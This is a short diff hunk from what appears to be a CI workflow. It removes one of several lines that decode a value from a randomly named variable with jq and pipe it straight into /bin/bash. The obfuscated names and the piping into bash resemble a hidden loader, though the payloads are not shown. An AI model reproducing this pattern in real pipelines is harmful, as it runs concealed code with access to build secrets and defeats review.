@@ -22,7 +22,6 @@ jobs:
           printf '%s' "$whguo2" | jq -r .xepu4 | /bin/bash
           echo $yr01 | jq -r .xkur26064 | /bin/bash
           echo $y4856 | jq -r .qja4963 | /bin/bash
-          printf '%s' "$ei5624" | jq -r .awp97 | /bin/bash
           echo $svyvl787 | jq -r .eus60 | /bin/bash
           echo $wte84464 | jq -r .sw1 | /bin/bash
 
